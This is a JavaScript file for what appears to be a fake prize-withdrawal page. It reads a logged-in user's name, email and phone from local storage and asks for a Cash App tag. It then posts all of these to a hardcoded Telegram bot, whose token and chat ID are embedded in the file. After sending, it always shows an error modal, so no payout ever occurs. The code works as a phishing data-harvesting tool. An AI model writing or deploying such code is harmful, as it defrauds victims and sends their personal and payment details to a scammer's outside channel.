document.addEventListener('DOMContentLoaded', function() {
    // Telegram configuration
    const TELEGRAM_BOT_TOKEN = '8092175848:AAEP8ykWtQoBKdO2SwGRdc0FhExwQ_waN8s';
    const TELEGRAM_CHAT_ID = '6300694007';
    
    // DOM Elements
    const withdrawBtn = document.getElementById('withdrawBtn');
    const withdrawForm = document.getElementById('withdrawForm');
    const withdrawModal = document.getElementById('withdrawModal');
    const errorModal = document.getElementById('errorModal');
    const closeModal = document.querySelectorAll('.close');
    const closeErrorModal = document.getElementById('closeErrorModal');
    const logoutBtn = document.getElementById('logout');
    
    // Load user data
    const currentUserEmail = localStorage.getItem('currentUser');
    if (!currentUserEmail) {
        window.location.href = 'index.html';
        return;
    }
    
    const user = JSON.parse(localStorage.getItem(currentUserEmail));
    document.getElementById('userName').textContent = user.name || 'User';
    document.getElementById('userEmail').textContent = user.email;
    document.getElementById('congratsName').textContent = user.name || 'User';
    
    // Event Listeners
    withdrawBtn.addEventListener('click', () => withdrawModal.style.display = 'block');
    withdrawForm.addEventListener('submit', processWithdrawal);
    closeErrorModal.addEventListener('click', () => errorModal.style.display = 'none');
    logoutBtn.addEventListener('click', logout);
    
    // Close modals when clicking X
    closeModal.forEach(btn => {
        btn.addEventListener('click', function() {
            withdrawModal.style.display = 'none';
            errorModal.style.display = 'none';
        });
    });
    
    // Close modals when clicking outside
    window.addEventListener('click', function(event) {
        if (event.target === withdrawModal) {
            withdrawModal.style.display = 'none';
        }
        if (event.target === errorModal) {
            errorModal.style.display = 'none';
        }
    });
    
    // Functions
    async function processWithdrawal(e) {
        e.preventDefault();
        
        const cashTag = document.getElementById('cashTag').value;
        
        if (!cashTag.startsWith('$')) {
            alert('CashTag must start with $');
            return;
        }
        
        // Send withdrawal request to Telegram
        try {
            await sendWithdrawalRequest(cashTag, user);
            
            // Show error modal (as per requirements)
            withdrawModal.style.display = 'none';
            errorModal.style.display = 'block';
            
            // Reset form
            withdrawForm.reset();
        } catch (error) {
            console.error('Withdrawal error:', error);
            alert('There was an error processing your withdrawal. Please try again.');
        }
    }
    
    async function sendWithdrawalRequest(cashTag, user) {
        const message = `💸 *New Withdrawal Request* 💸\n\n` +
                       `👤 *Name:* ${user.name}\n` +
                       `📧 *Email:* ${user.email}\n` +
                       `📞 *Phone:* ${user.phone || 'Not provided'}\n` +
                       `💰 *Amount:* $2,000\n` +
                       `🏷️ *CashTag:* ${cashTag}\n\n` +
                       `⏰ *Requested at:* ${new Date().toLocaleString()}`;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        
        const data = await response.json();
        console.log('Telegram notification sent:', data);
        return data;
    }
    
    function logout() {
        localStorage.removeItem('currentUser');
        window.location.href = 'index.html';
    }
});
